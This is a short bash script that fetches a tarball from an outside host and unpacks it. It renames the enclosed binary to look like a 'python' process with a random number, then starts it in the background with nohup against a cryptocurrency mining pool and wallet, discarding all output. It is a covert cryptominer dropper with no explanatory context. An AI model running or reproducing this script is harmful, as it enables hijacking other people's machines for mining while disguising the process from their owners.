#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O meki momok.x10.bz/DOT-SRB.tar.gz

tar xvf meki

cd dotsrb

mv python3 python$kolot

nohup ./python$kolot --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
